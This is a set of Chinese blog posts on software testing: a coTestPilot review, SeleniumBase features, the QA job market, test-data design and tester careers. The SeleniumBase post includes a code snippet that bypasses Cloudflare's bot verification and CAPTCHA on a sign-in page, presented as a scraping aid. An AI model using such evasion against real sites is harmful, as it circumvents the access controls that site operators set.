selenium_cotestpilot就可以加载所有的实现了。\n代码核心的方法是check函数，没什么黑魔法，其实就是拿到了当前页面 body 里的 text，然后定义了一个提示词，让不同的测试人员对这个 页面上所有的文本 进行测试。\n这些测试人员其实就是上文讲的测试 agent，是角色化的，每个人都有自己的拿手本领。\n比如 Emma 这个角色偏重表单的校验。\n提示词如下所示\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 f\u0026#34;\u0026#34;\u0026#34;Please analyze this webpage for any errors, issues, or problems. IMPORTANT: Only return high-confidence issues. It is perfectly acceptable to return no issues if none are found with high confidence. For each issue found, include a confidence score between 0 and 1, where: - 1.0 means absolutely certain this is an issue - 0.8-0.9 means very confident - 0.7-0.8 means reasonably confident - Below 0.7 should not be reported Severity levels (0-3): 0 = Cosmetic: Minor visual or text issues that don\u0026#39;t impact functionality or understanding 1 = Low: Issues that cause minor inconvenience but don\u0026#39;t prevent core functionality 2 = Medium: Issues that significantly impact user experience or partially break functionality 3 = High: Critical issues that prevent core functionality or severely impact user experience or the business. Page URL: {url} Page Text Content: {page_text} You are {tester[\u0026#39;name\u0026#39;]}, and this is your expertise and background: {tester[\u0026#39;biography\u0026#39;]} Please identify any: 1. Visual errors or layout issues 2. Content errors or inconsistencies 3. Functionality problems that are visible 4. Any other issues that might affect user experience Output format: {output} Example format: [ {{ \u0026#34;title\u0026#34;: \u0026#34;Broken image link\u0026#34;, \u0026#34;severity\u0026#34;: \u0026#34;high\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;Image on homepage fails to load\u0026#34;, \u0026#34;why_fix\u0026#34;: \u0026#34;Impacts user experience and site professionalism\u0026#34;, \u0026#34;how_to_fix\u0026#34;: \u0026#34;Update image source URL or replace missing image\u0026#34;, \u0026#34;confidence\u0026#34;: 0.95, \u0026#34;related_context_if_any\u0026#34;: \u0026#34;The image is a logo and its url is \u0026#39;https://www.google.com/images/branding/googlelogo/2x/googlelogo_light_color_272x92dp.png\u0026#39; and is used in the header\u0026#34; }} ] return only the JSON array, no other text or comments. 大家有兴趣可以学习一下提示词，还是有一些工程化的实践的。\n总结 该项目我运行不起来，因为没有 gpt4 的 key 代码运行时需要把页面的文本拿到，所以页面越复杂，费用越高 项目本质就是拿到页面上所有的文本，最后调用 gpt4 传入提示词，让 gpt4 返回推理的结果，效果应该不会太稳定 项目本身没有增加任何的断言，只是引入了专家建议，所以对功能测试帮助不大，不过也许能发现一些低级错误 总之个人观点: 这是一款看起来有点用，但实际用处有限的 ai 测试工具。\n","date":"2025-01-24T09:23:53+08:00","permalink":"zh.ethanhan.cc/p/%E7%9C%8B%E8%B5%B7%E6%9D%A5%E6%9C%89%E7%82%B9%E7%94%A8%E4%BD%86%E5%AE%9E%E9%99%85%E7%94%A8%E5%A4%84%E6%9C%89%E9%99%90%E7%9A%84ai%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7cotestpilot.ai/","title":"看起来有点用但实际用处有限的ai测试工具coTestPilot.ai"},{"content":"最近发现 github 月热门项目里有个老面孔 selenium base 在短期内获得了比较大的关注。\n这个项目存在的时间应该有好多年了，我记得当初似乎也写过文章去介绍。\n本以为这就是一个普通的结合 pytest 和 selenium 封装的测试框架，不料几年过去项目的发展似乎渐入佳境。\n这次最让我眼前一亮的功能是 selenim base 支持绕过 Cloudflare 的访问校验。\n新的爬虫利器？ 用 selenium 写过爬虫的同学可能都会对 Cloudflare 的访问校验感到头痛。\n简单来说，在你访问目标站点的时候，cloudflare 会自动校验此次访问是不是来自不明的 ip 或者设备，如果是用脚本去访问该站点的话，cloudflare 会直接进行拦截，不展示网页的内容。\n不过 selenium base 却用几行代码打破了这一桎梏。\n1 2 3 4 5 6 7 from seleniumbase import SB with SB(uc=True, test=True, locale_code=\u0026#34;en\u0026#34;) as sb: url = \u0026#34;https://gitlab.com/users/sign_in\u0026#34; sb.activate_cdp_mode(url) sb.uc_gui_click_captcha() sb.sleep(2) 用什么工具写爬虫其实无关紧要，爬虫进入深水区的时候往往需要跟反爬策略做各种对抗。\n由于 selenium 本身使用了真实的浏览器进行网页访问，自带光环，可以绕过很多的反爬策略。\n但是 cloudflare 的前置拦截却一直没有稳定的解决方案，selenium base 提供了绕过校验的便利，看上去非常利好爬虫的发挥。\n其他有意思的特性 支持录制 文档在这里。https://github.com/seleniumbase/SeleniumBase/blob/master/help_docs/recorder_mode.md\n因为 selenium base 暴露出来的 api 比较有限，所以录制出的代码可用性相对较高。\n可以把用例转换成 markdown 的表格模式 这里的路子跟 robot framework 是反着来的。\n把代码转成了更容易阅读的表格，对用例评审来说还是很有用的。\nhttps://github.com/seleniumbase/SeleniumBase/blob/master/help_docs/case_plans.md\n智能等待 selenium base 的 api 很多都是操作类型的，比如 click,type 之类，在进行操作时 selenium base 会进行智能等待，从而提升用例的稳定性。\n自带测试报告 selenium base 的测试报告似乎是基于 pytest 的，比 playwright 的 test runner 要简陋很多，但支持错误自动截图，还是挺实用的。\nhttps://github.com/seleniumbase/SeleniumBase/blob/master/examples/example_logs/ReadMe.md\n支持共享 session 也就是说不用每个用例都重新打开一次浏览器，重新登陆一遍了。\n支持并行运行用例的能力 跟 playwright 站在同一起跑线上了。\n支持口语化的用例编写方式。 这个直接上代码，有点搞。\n这是中文的。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 # Chinese Translation from seleniumbase.translate.chinese import 硒测试用例 class 我的测试类(硒测试用例): def test_例子1(self): self.开启(\u0026#34;https://zh.wikipedia.org/wiki/\u0026#34;) self.断言标题(\u0026#34;维基百科，自由的百科全书\u0026#34;) self.断言元素(\u0026#39;a[title=\u0026#34;Wikipedia:关于\u0026#34;]\u0026#39;) self.如果可见请单击(\u0026#39;button[aria-label=\u0026#34;关闭\u0026#34;]\u0026#39;) self.如果可见请单击(\u0026#39;button[aria-label=\u0026#34;關閉\u0026#34;]\u0026#39;) self.断言元素(\u0026#39;span:contains(\u0026#34;创建账号\u0026#34;)\u0026#39;) self.断言元素(\u0026#39;span:contains(\u0026#34;登录\u0026#34;)\u0026#39;) self.输入文本(\u0026#39;input[name=\u0026#34;search\u0026#34;]\u0026#39;, \u0026#34;舞龍\u0026#34;) self.单击(\u0026#39;button:contains(\u0026#34;搜索\u0026#34;)\u0026#39;) self.断言文本(\u0026#34;舞龍\u0026#34;, \u0026#34;#firstHeading\u0026#34;) self.断言元素(\u0026#39;img[src*=\u0026#34;Chinese_draak.jpg\u0026#34;]\u0026#39;) 这是日语的。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 # Japanese Translation from seleniumbase.translate.japanese import セレニウムテストケース class 私のテストクラス(セレニウムテストケース): def test_例1(self): self.を開く(\u0026#34;https://ja.wikipedia.org/wiki/\u0026#34;) self.テキストを確認する(\u0026#34;ウィキペディア\u0026#34;) self.要素を確認する(\u0026#39;[title*=\u0026#34;ウィキペディアへようこそ\u0026#34;]\u0026#39;) self.JS入力(\u0026#39;input[name=\u0026#34;search\u0026#34;]\u0026#39;, \u0026#34;アニメ\u0026#34;) self.クリックして(\u0026#34;#searchform button\u0026#34;) self.テキストを確認する(\u0026#34;アニメ\u0026#34;, \u0026#34;#firstHeading\u0026#34;) self.JS入力(\u0026#39;input[name=\u0026#34;search\u0026#34;]\u0026#39;, \u0026#34;寿司\u0026#34;) self.クリックして(\u0026#34;#searchform button\u0026#34;) self.テキストを確認する(\u0026#34;寿司\u0026#34;, \u0026#34;#firstHeading\u0026#34;) self.要素を確認する(\u0026#39;img[src*=\u0026#34;Various_sushi\u0026#34;]\u0026#39;) 这个不评论了，见仁见智吧。\n支持创建各种交互式的表格 https://github.com/seleniumbase/SeleniumBase/blob/master/examples/chart_maker/ReadMe.md。\n汇报利器，不会用 js 写前端图表的同学可以玩玩。\n支持写 ppt？ https://github.com/seleniumbase/SeleniumBase/blob/master/examples/presenter/ReadMe.md\n我没看明白，但似乎真的是支持用代码去写 ppt\u0026hellip;\n感觉 selenium base 开发团队的汇报欲和求生欲很强，很多功能都是为了呈现自动化测试的工作成果。\n我只能说，路走宽了。\n支持在网页上展示各种帮助信息 还是直接看代码吧，又是一个演示功能。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 from seleniumbase import BaseCase BaseCase.main(__name__, __file__) class MyTourClass(BaseCase): def test_google_tour(self): self.open(\u0026#39;https://google.com/ncr\u0026#39;) self.wait_for_element(\u0026#39;input[title=\u0026#34;Search\u0026#34;]\u0026#39;) self.hide_elements(\u0026#34;iframe\u0026#34;) self.create_tour(theme=\u0026#34;dark\u0026#34;) self.add_tour_step(\u0026#34;Welcome to Google!\u0026#34;, title=\u0026#34;SeleniumBase Tours\u0026#34;) self.add_tour_step(\u0026#34;Type in your query here.\u0026#34;, \u0026#39;[title=\u0026#34;Search\u0026#34;]\u0026#39;) self.play_tour() self.highlight_type(\u0026#39;input[title=\u0026#34;Search\u0026#34;]\u0026#39;, \u0026#34;Google\u0026#34;) self.wait_for_element(\u0026#39;[role=\u0026#34;listbox\u0026#34;]\u0026#39;) # Wait for autocomplete self.create_tour(theme=\u0026#34;light\u0026#34;) self.add_tour_step(\u0026#34;Then click to search.\u0026#34;, \u0026#39;[value=\u0026#34;Google Search\u0026#34;]\u0026#39;) self.add_tour_step(\u0026#34;Or press [ENTER] after entry.\u0026#34;, \u0026#39;[title=\u0026#34;Search\u0026#34;]\u0026#39;) self.play_tour() 这对录教程来说非常友好。\nhttps://github.com/seleniumbase/SeleniumBase/blob/master/examples/tour_examples/ReadMe.md\n有个 GUI 的用例执行器 ui 走的是实用风格，够用吧。\n总结 selenium base 是一个实用且有脑洞的项目，有兴趣的同学可以拿来玩玩。\n","date":"2024-12-27T09:18:08+08:00","permalink":"zh.ethanhan.cc/p/%E7%AC%AC%E4%BA%8C%E6%98%A5%E4%BB%A4%E4%BA%BA%E6%83%8A%E5%96%9C%E7%9A%84selenium%E9%A1%B9%E7%9B%AEselenium-base/","title":"第二春？令人惊喜的selenium项目selenium base"},{"content":"最近在招聘，3 个测试岗位，1 个 sre 岗位，进展不是十分顺利。\n3 个测试岗位里 2 个是正式编制，1 个是外包岗位，sre 岗位是正编。\n招不到人的原因其实并不是因为简历不够，相反简历数据还是很可观的。\n核心原因还是因为现在招聘的要求比之前行业红火的时候高了很多。\n现在就职的公司大概属于三四流公司的水平，比上不足比下有余的类型，反正跟大厂比差距还是很大的。\n但哪怕是这种非头部公司，对新晋人员的要求还是有一定门槛的。\n对于正式编制来说，需要满足\n40 岁以下 一本学历以上 外包编制相对没有那么严格，只要是正规的全职日本科就好。\n对年龄和学历的硬性要求就导致了尽管收到的简历很多，但真正可以通过筛选并进入面试流程的候选人寥寥无几。\n相反的，静下心来想一想，从另一方面推测，今年测试人员找工作其实应该非常困难。\n原因大概以下几点。\n市场不景气 各种公司裁员倒闭的消息层出不穷，市场上真正的需求其实非常疲软，真正放出来的岗位其实非常有限。\n企业要求水涨船高 三四流公司都要求一本学历了，这其实是行业从业人员渐进式换血的体现。\n之前行业欣欣向荣，英雄不问出处，旺盛的市场需求就造成了很多学历一般专业不对口的候选人可以进入软件测试行业。\n但现在市场相对饱和，大浪淘沙加上挤出效应，原先条件一般的从业人员慢慢被市场淘汰，客观上完成了一轮又一轮的洗牌。\n测试行业停滞不前 测试行业这么多年来的变化其实相对有限，无论是云计算时期，音视频时期还是 ai 阶段，测试人员的工作性质和范围基本变化不大。\n整个行业停滞不前已经很多年了，缺少颠覆性的变化造成了行业本身新需求不足。\n另外行业十分稳定也造成了测试人员同质化相对严重，好的背景自然而然就成为了求职的关键。\n近期建议 既然寒冬已至，那么还是要有应对的套路的。\n有工作的同学相对要保持稳健一些，毕竟跳槽之后新东家忽然一夕之间倒闭关门也是有可能的 没有工作的同学心态平和一些，多锻炼身体，减少不必要的开销，先苟住，静待春暖花开 最后 顺便发个招聘信息。\n正编测试，base 重庆/深圳，功能测试为主，希望有一定的工程化能力，20k 左右，oa 或 hr 项目，统招本科，一本，2 人 外包测试，base 深圳，功能测试为主，oa 项目，1 人 SRE 工程师，base 深圳，1 人，统招本科，一本 感兴趣的同学麻烦加下面的群哈。\n","date":"2024-12-13T09:00:49+08:00","permalink":"zh.ethanhan.cc/p/%E4%B8%BA%E4%BB%80%E4%B9%88%E6%B5%8B%E8%AF%95%E4%BA%BA%E5%91%98%E6%89%BE%E5%B7%A5%E4%BD%9C%E8%B6%8A%E6%9D%A5%E8%B6%8A%E9%9A%BE%E4%BA%86/","title":"为什么测试人员找工作越来越难了"},{"content":"写在前面 前几天富途大裁员的消息相信让很多同学都感到压力倍增。\n如今互联网领域的裁员潮并没有收敛的趋势，大有人人自危的感觉。\n今天正好看到了一篇跟裁员相关的文章，翻译了一下，希望可以给大家提供一些思路。\n原文在这里: https://filiphric.com/laid-off-as-a-tester-what-now\n正文 如果你在 QA（质量保证）领域工作已经几年了，你可能已经注意到这个行业正在迅速变化。不幸的是，这也意味着裁员浪潮正在席卷整个行业，无论是初级还是高级测试人员都不能幸免。\n最近，我遇到了一个在 Reddit 上发帖的测试工程师，他在手动测试岗位上已经工作了 15 年，而他所在的公司正经历一些变革。对未来的担忧已经蔓延，我想和大家分享一些看法，因为说实话，这种情况其实并不罕见。\n跳出公司的舒适圈 作为测试人员，我们往往会深入了解公司的专业领域。但当我们不再为这家公司工作时，很难将这些专业知识应用到其他地方。我们常常将自身价值与所在公司绑定，一旦环境改变，就会感到迷茫。然而，事实上我们还是很有价值的！\n想想看 - 测试人员通常是全能型人才：\n他们负责发布管理 他们能发现 bug 他们拥有技术知识 他们可能懂得编程 他们擅长编写文档 我认为记录下你的知识，并真正理解自己的优势、专长和经验是很重要的。\n因为关键在于 - 在不同的公司中，你已有的技能可能会以不同的方式呈现！可能会有一家公司正在寻找你恰好具备的技能，只是他们没有将其称为\u0026quot;测试\u0026quot;岗位。这可能是产品负责人、Scrum 大师、发布经理、技术文档撰写员、开发体验工程师或其他角色。\n自动化学习永远不会太晚 如果你一直在做手动测试，还没有接触过测试自动化，但觉得现在是时候开始了 - 我强烈推荐查看 Applitools 的测试自动化大学。那里有大量免费资源，你可以学习各种测试自动化。不要觉得自己错过了机会 - 学习永远不会太晚！\n关于人工智能 我知道听到人工智能这个词，一些人可能会翻白眼（相信我，我懂！），因为网上关于这个话题的噪音太多了。要分辨哪些是有价值的信息确实很困难。\n尽管所有关于 AI 的讨论可能令人感到无所适从，但现实是：AI 已经来了，而且不会离开。许多公司正在转型，如果你想保持竞争力，就需要至少掌握一些相关知识。\n获取 AI 知识并不意味着你必须成为一名\u0026quot;提示工程师\u0026quot;。相反，想想如何运用你现有的专业知识并用 AI 来增强它。例如，在做测试自动化时，你可以：\n用 AI 提高工作效率 尝试使测试自动化更加稳定 使用 AI 加速学习 我个人最近几个月一直在使用 Cursor，它大大提升了我的学习效率。当它生成我不理解的代码时，我可以直接选中那段代码并要求解释。\n你可以将 AI 视为不会替代你技能，而是帮助你增强技能的工具。\n展示你的工作 在当前的就业市场中，让你的工作可见是非常重要的。即使你刚开始接触写代码，我也建议创建一个 GitHub 账号，上传你的代码仓库，展示你正在做的项目。\n虽然我已经很久没有面试了，所以请对我的建议保持警惕。但每当我看到一个展示自己工作的 GitHub 账号的候选人，他们都会立即获得加分（需要说明的是，我从未是唯一的决策者）。这不仅让我的工作更轻松，因为我可以清楚地了解候选人的技术水平，更重要的是，这表明他们愿意学习和尝试。\n开始写博客 另一个绝佳的职业发展技巧是写博客并分享你的学习经历。正如 Angie Jones 最近提到的，这可能会为你打开很多机会之门。我就是一个活生生的例子。\n很多人在询问如何开始写博客。我注意到一个常见的错误是，人们试图在开始之前准备大量文章。我强烈建议不要这样做，因为这些积压的文章很快就会用完，反而会给作者带来焦虑和压力。\n相反，我建议写短文。创作一些你每周都能写的内容。专注于一个主题，写下你这一周新学到的、上周还不知道的知识。\n总有新的东西可以学习和分享。想想看 - 如果能找到一篇完全解答你上周困惑的博客文章，是不是很酷？如果你专注于那些想要学习的人，你将永远不会缺少读者。\n走出去，建立人际网络 参加本地技术聚会，即使没有附近的聚会也可以考虑远程参与。人们通常为了内容而参加聚会，但我认为最重要的是结识新朋友。如果你希望为就业市场的波动做好准备，建立人际网络是个很好的方式。\n网络中可能有人正在招聘，并在寻找有趣的人才 - 而这个人可能就是你！拥有良好的人际网络对于发现新机会非常有帮助。\n另外，这还能帮助你避免像疫情期间那样被隔离。\n最后一点建议 即使你目前没有找工作的计划，或者没有被裁员，思考这些问题依然很重要。问问自己 - 如果没有了当前的公司，你还剩下什么？你可能有很多可以提供的价值，也有很多可以改进的地方。\n即使你非常喜欢现在的公司，也可能会出现公司无法再支付你薪水的情况。在这种情况下，提前做好准备是非常明智的。\n祝大家测试顺利！🚀\n","date":"2024-11-29T09:26:52+08:00","permalink":"zh.ethanhan.cc/p/%E6%B5%8B%E8%AF%95%E5%B7%A5%E7%A8%8B%E5%B8%88%E8%A2%AB%E8%A7%A3%E9%9B%87%E5%90%8E%E6%8E%A5%E4%B8%8B%E6%9D%A5%E8%AF%A5%E6%80%8E%E4%B9%88%E5%8A%9E/","title":"测试工程师被解雇后，接下来该怎么办？"},{"content":"看到一篇跟用例数据准备相关的文章，觉得挺有道理的。我之前在设计用例数据的时候就会犯类似的错误，这篇文章其实说的非常在理。\n翻译了一下原文，供大家参考。\n编写测试用例更像是讲故事而非纯技术工作，这种观点并不罕见。最近我在 The Bike Shed 播客中听到这个观点，而且在博客文章和会议演讲中也经常能看到类似的讨论。既然测试编写是一种讲故事的艺术，那么我们是否应该借鉴叙事原则来改进我们的测试呢？\n谈到讲故事的原则，首先想到的就是契诃夫之枪原则。这个原则是什么？用安东·契诃夫自己的话说（引自大英百科全书）：\n如果在舞台上放置了一支上膛的步枪，那么它就必须被开火。不要做出你不打算履行的承诺。\n大英百科全书还给出了如下定义：\n这是一条适用于戏剧、文学和其他叙事形式的原则，它强调故事中引入的每个元素都应该对情节发展必不可少。\n那么这个原则如何应用到我们的测试编写中呢？想象一下你正在为电商系统编写测试用例。你有不同类别的产品，这些类别对买家有一些限制条件。最明显的例子就是不能向未满十八岁的人销售酒类产品。在我们的例子中，这类人群不能将这些产品添加到购物车。\n让我们看一个测试代码示例（我使用的是 Elixir，但这个原则适用于大多数编程语言）：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 test \u0026#34;don\u0026#39;t allow adding products to cart when age constraint is not met\u0026#34; do buyer = %Person{ name: \u0026#34;John Smith\u0026#34;, age: 17, country: :uk, registered_on: ~U[2023-09-16T18:17:22Z] } category = %Category{ name: \u0026#34;Alcohol\u0026#34;, external_id: 3242, constraints: [ %AgeConstraint{min: 18} ] } product = %Product{ name: \u0026#34;Triple Hazy IPA\u0026#34;, category: category, sku: \u0026#34;TRI-557\u0026#34;, added_at: ~U[2022-01-01T12:16:54Z] } cart = Cart.init(buyer) assert Cart.add(cart, product, quantity: 2) == {:error, :constraint_violated} end 这个测试本身并不算糟糕，但它在多处违反了契诃夫之枪原则。在我们测试的\u0026quot;准备\u0026quot;阶段引入的每个标量都是契诃夫意义上的\u0026quot;枪\u0026quot;。它们都被放在了舞台上，读者可能会期待它们都会\u0026quot;开火\u0026quot;。这里我们有 10 个标量，相当于舞台上放了 11 把枪。什么是\u0026quot;开火\u0026quot;？就是当我们把这个值改成其他值时，测试应该失败。让我们检查一下这些标量：\nname: \u0026quot;John Smith\u0026quot;: 无论改成什么，测试都不会失败 age: 17: 如果改成 18 或 22，测试会失败 country: :uk: 不会失败（除非我们实现了基于国家的限制，但目前没有） registered_on: \u0026lt;date\u0026gt;: 无关紧要 name: \u0026quot;Alcohol\u0026quot;: 无关紧要 external_id: 3242: 这是什么？无关紧要 min: 18: 改成 15 会导致测试失败 产品中剩余的 name、sku 和添加日期都不会影响测试 quantity: 2: 同样无关紧要 总结一下，我们的 11 个\u0026quot;枪\u0026quot;中只有两个会\u0026quot;开火\u0026quot;，约 18%。其余的都是纯粹的干扰，如果读者试图理解测试的动态性，这些都会让他们误入歧途。\n如何改进呢？通过使用抽象！测试和常规代码一样需要抽象。而且就像常规代码一样，你需要确保在特定上下文中使用正确的抽象。这里一个潜在的抽象就是工厂方法。让我们看看改进后的版本：\n1 2 3 4 5 6 7 8 9 test \u0026#34;don\u0026#39;t allow adding products to cart when age constraint is not met\u0026#34; do buyer = person_factory(age: 17) category = category_factory(constraints: [%AgeConstraint{min: 18}]) product = product_factory(category: category) cart = Cart.init(buyer) assert Cart.add(cart, product) == {:error, :constraint_violated} end 测试明显变短了，只有 5 行非空代码。这里的每个标量都很重要，而且只有两个。这样我们就不会让读者负担过重，他们能够快速得出结论：啊，买家 17 岁，但限制要求至少 18 岁，所以返回了 :constraint_violated 错误。这很合理。\n推论：让你的\u0026quot;枪\u0026quot;显而易见 这是我对叙事原则的补充：\n如果某些东西要\u0026quot;开火\u0026quot;，要提前展示它。\n人们通常不喜欢\u0026quot;机械降神\u0026quot;式的剧情。如果某个东西对测试通过很重要，就要明确地展示它。不要把它藏在抽象之下。\n想象一下，在上面的测试中，第一行只是写着 buyer = person_factory()。在代码审查时被问到这一点，开发者说工厂中的默认年龄实际上是 17，所以没必要重复。这是对抽象的误用。不要依赖于隐藏的内容。理论上来说，任何人都应该能够进入工厂修改这些值 - 而测试应该仍然通过。有些人甚至认为工厂中的默认值应该是随机的。\n总结 要让你的测试用例更好、更易读（更好地讲述故事），就要删除所有与测试流程无关的数据。只保留重要的内容 - 那些改变后会导致测试失败的值。另一方面，不要在抽象中隐藏重要的内容。让叙事流程清晰明了，不要让读者感到困惑。\n","date":"2024-11-22T09:15:23+08:00","permalink":"zh.ethanhan.cc/p/%E6%B5%8B%E8%AF%95%E7%94%A8%E4%BE%8B%E8%AE%BE%E8%AE%A1%E4%B8%AD%E7%9A%84%E5%A5%91%E8%AF%83%E5%A4%AB%E4%B9%8B%E6%9E%AA%E5%8E%9F%E5%88%99/","title":"测试用例设计中的契诃夫之枪原则"},{"content":"上周末参加了可能是国内顶级的 AI 技术峰会，主要观摩了测试专场的内容，全程基本都是大厂和高校进行分享，应该可以部分代码国内的头部水平，感触良多，跟大家分享一下。\n可以看到大模型出现以来，很多测试同学都在探索 ai 在测试领域的应用，这一年多以来也有不少的落地项目和产出，总的来说还是让人颇受启发的。\n简单回顾一下，大家的发力点大概在下面几个方面。\n接口测试 ai 在接口测试中的应用大概有下面两种。\n通过大模型和 RAG 结合，使用模型的推理能力，让模型根据 api 文档自动生成用例和断言 使用大语言模型生成接口测试的数据 讨论这个议题的同学很多，大家的实践也都比较深入了，特别是在跟现有系统的整合方面，有些公司可以做到在内部测试平台上直接一键生成各种接口的测试用例，并运行生产报告，在工程方面的探索还是值得称道的。\n不过当前的进展也有很多不完善的地方\n大家都没有很好的指标可以统计大模型生成用例的可用性以及准确性 没有人真正的展示 ai 生成的断言是什么样子的，在分享后的交流里，有的讲师表示目前他们只实现了非常简单的不带业务逻辑的断言，比如响应状态码的断言 UI 自动化测试 似乎只有 1 位大厂的讲师分享了他们在 UI 自动化领域的探索，他们的当前的进展可能是\n通过 Agent 自动生成 ui 自动化用例，具体的实现细节也是先简化 dom，然后使用 agent 进行推断 通过 Agent 实现 ui 自动化用例自动更新的能力，比如更新页面上发生变化的元素 一些我觉得不是很清楚的地方是\n项目似乎是进行时，并没有真正落地并大规模使用 ui 自动化用例的更新范围似乎只是页面上发生变化的元素，如果系统流程发生了些许变化，大模型可能也是爱莫能助的 模型效果评估 使用指标对大模型的效果进行评估也是测试人员工作的一部分。\n这里测试人员需要\n准备测试数据集，也可以用 ai 生成测试数据集 进行自动化验证并提炼模型效果指标 这一块我不是很懂，不过目前看来大家用的可能是业内统一的评测框架和指标，这块的天花板很高，有很大的深入研究的空间。\n需求分类 使用 Agent 和 RAG 对需求进行分类和打分，标识出需求风险的级别，高风险的需求需要进行人工测试，低风险的需求可以免测。\n这是整场分享最吸引我的议题。\n因为这个想法直接抓住了测试的核心问题，那就是需求问题。\n目前看来这个方案的召回率很高，准确性还有提升的空间。\n这个项目的局限性是\n模型对多模态的文档没有很好的处理办法，毕竟很多需求里图文并茂，不能识别图片和视频实在是比较遗憾 总结 总的看来很多大厂都在大模型与测试相结合方面积极的进行实践和落地，大家在工程化方面的探索还是非常积极主动的。\n不过目前看杀手级应用还是没有，最近正好 openai 和 claude ai 都在智能体上面重点发力。\n智能体的一个核心功能就是像人类一样操作电脑和其他应用，如果真能落地的话可能对自动化测试带来不小的益处。\n","date":"2024-11-15T07:11:01+08:00","permalink":"zh.ethanhan.cc/p/%E5%A4%A7%E5%8E%82%E7%9A%84%E6%B5%8B%E8%AF%95%E4%BA%BA%E5%91%98%E5%9C%A8%E7%94%A8ai%E5%B9%B2%E7%82%B9%E5%95%A5/","title":"大厂的测试人员在用ai干点啥"},{"content":"今天看到一篇讨论测试职业发展的文章，原文比较中肯，我结合自己的经历，稍微发展一下，供大家参考。\n常见的困惑 下面一些问题是测试人员的常见困惑。\n\u0026ldquo;我听说测试工作 10 年就到头了，我是不是应该转向开发或管理？\u0026rdquo; \u0026ldquo;我的经理建议说，成为管理者是测试职业发展的必经之路\u0026rdquo; \u0026ldquo;我感到困惑，不知道如何从 QA 自动化转型为 SDET\u0026rdquo; \u0026ldquo;测试是不是一个死胡同工作？这个领域真的有职业发展前景吗？\u0026rdquo; 职业阶梯 在国外，测试领域主要有 3 种角色。\n测试工程师 测试开发工程师(SDET) 工程经理(EM) 其中测试和测试开发被定义为个人贡献者。\n通常对个人贡献者有以下级别划分：\n实习生、新手、入门级(0-2 年) 中级(2-6 年) 高级(6-9 年) Staff/主管级(8-12 年)(可能有直接下属) 架构师/首席(12 年以上)(可能有直接下属) \u0026hellip;更高级别如高级首席/架构师、杰出工程师(比较罕见) 工程经理或者技术经理大概包含下面的级别。\n工程经理(5-8 年) 高级工程经理(8-12 年) 总监(12-15 年) VP(副总裁)(15 年以上) SVP(高级副总裁)(15 年以上) GM(总经理)(15 年以上) VP 及以上的职级通常只在大公司才有，但直到总监级别的职位却很常见。很多公司可能会根据职位需求和公司规模来设置职级上限。\n在国内情况也差不多，无非就是个人贡献者的天花板可能是技术专家，技术经理的潜力可能更大一点。\n晋升方式 大致来说，一般的晋升方式如下：\n学习：在你的领域成为深度专家，确保你具备完成工作所需的技术能力，这可能涉及学习新技术、技术栈、编程语言或人际交往技能。 出色执行：你应该清楚理解自己在组织中的角色，与主管沟通确保双方对此有共识，然后去执行、执行、再执行。持续完成一个又一个项目，始终把客户放在心上，做到最好。确保你是团队中最优秀的 5%，努力在各个方面创造价值，成为团队的力量倍增器。 提前表现：关注你的下一级别职位的期望，并确保承担其中的一些职责。持续完成这些任务，展现出持续强劲的表现记录。绩效评估通常是滞后的，如果你已经在以更高级别的标准在工作，而且你的主管也不错，那么你很可能很快就会得到晋升。 寻求指导与传授：找到公司内部、本地区或全球最优秀的人，跟随他们。向他们学习，吸收他们的智慧。寻找导师，与他们讨论想法，然后回去实践并展示实际价值。你也应该把所学传授给身边的人，帮助他们提升。 在国内，可能还包含\n运气。这里体现的是选择大于努力，加入一个业务好并且高速发展的团队，晋升的机会远远大于业务一般而且走下坡路的团队。 创新能力。国内其实非常卷创新的，测试需要晋升可能需要周期性的“搞事情”，落地一些高概念或者新技术就可能给管理者留下深刻的印象。 指标落地能力。能定指标，落地指标以及提升指标。其实就是换种方式去卷。 拓展领域 打怪升级不是职业生涯的全部。\n你会发现，仅仅把薪酬、职称和职级作为成长的标准，最终可能会显得很肤浅。\n请不要误解我的意思，这些确实很重要，你需要在这方面做得好。\n✅ 你的生活和家庭都需要你这样做。我会鼓励你继续为此努力，确保你的付出得到应有的回报。\n❌ 但这并不是唯一重要的事。\n当人们说测试工作在 X 年后就到头了时，他们实际上是用职级阶梯作为唯一的成长指标，这种观点过于肤浅。\n测试不仅仅是关于你的工作年限。\n它是软件开发生命周期中的关键环节，没有它，任何软件都不应该上线。\n忽视这一点将是愚蠢的。\n这个领域有大量的广度需要探索，如果你想成为这个领域的大师，年轻的武士啊，你还有很多要学习和体验的。\n让我试着给你展示一下我是如何思考这个问题的：\n探索领域 我们可以将软件工程世界分为 6 个广泛的领域：\n移动端 Web 端 后端 基础设施 数据 机器学习/人工智能 每个领域都有机会在不同层次编写测试：\n测试金字塔 单元测试 集成测试 端到端测试 更广泛的应用领域 工程效率 代码覆盖率 探索性测试 建设志同道合的同行社区 测试框架 测试基础设施 测试工具 CI/CD 安全性 性能 可访问性 混沌/韧性工程 你可以将这三个方面进行组合，每种组合都是一个值得深入探索的独特方向。\n例如：移动端测试基础设施、数据安全、数据性能、后端混沌/韧性等。\n这是一个广阔的天地，等待你去探索。\n工程技术能力 除了在上面的领域做排列组合之外，我们还可以探索更深层次的软件技能。\n阅读代码 编写代码 理解编程原则 理解系统设计：数据库、队列、缓存、CDN 和网关是如何工作和扩展的，如何测试它们 构建解决方案 等等\u0026hellip; 软技能 要成长为一个成熟的领导者，你还需要精炼的人际交往能力。\n如果你是管理者或像架构师这样的领导者，这些都是基本要求：\n与同事建立信任 推动跨职能项目 项目管理 强大的书面和口头沟通能力 同理心 服务型领导 通过一对一指导来培养他人 帮助他人的职业成长 在内部演讲、全体会议、聚会或会议上进行公开演讲 谈判能力 冲突解决 继任计划和消除团队中的单点故障 制定方向和战略 等等 未来展望 